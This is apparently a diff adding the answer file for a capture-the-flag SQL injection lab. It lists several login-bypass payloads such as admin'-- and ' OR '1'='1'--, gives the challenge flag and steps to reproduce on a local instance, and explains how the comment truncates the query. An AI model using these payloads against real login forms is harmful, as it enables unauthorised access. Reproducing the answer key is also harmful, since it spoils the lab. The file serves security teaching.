@@ -1,0 +1,43 @@
+# SQL Injection - Solution Payloads
+
+## Authentication Bypass (Comment-based)
+Username: admin'--
+Password: (anything)
+
+## Alternative Payloads
+
+# Using hash comment
+Username: admin'#
+Password: (anything)
+
+# Using OR logic (bypasses as first user - usually admin)
+Username: ' OR '1'='1'--
+Password: (anything)
+
+# Specific admin bypass
+Username: admin' OR '1'='1
+Password: (anything)
+
+## Flag
+ARENA{SQL_1nj3ct10n_m4st3r}
+
+## Steps to Reproduce
+1. Start the challenge: docker compose up
+2. Navigate to: http://localhost:3002
+3. Enter payload in login form:
+   - Username: admin'--
+   - Password: anything
+4. Click Login
+5. The admin's secret field will be displayed containing the flag
+6. Copy flag: ARENA{SQL_1nj3ct10n_m4st3r}
+7. Validate: ./validate.sh "ARENA{SQL_1nj3ct10n_m4st3r}"
+
+## SQL Query Analysis
+
+Original query:
+SELECT * FROM users WHERE username = 'admin' AND password = 'anything'
+
+After injection (admin'--):
+SELECT * FROM users WHERE username = 'admin'-- AND password = 'anything'
+
+Everything after -- is treated as a comment and ignored.
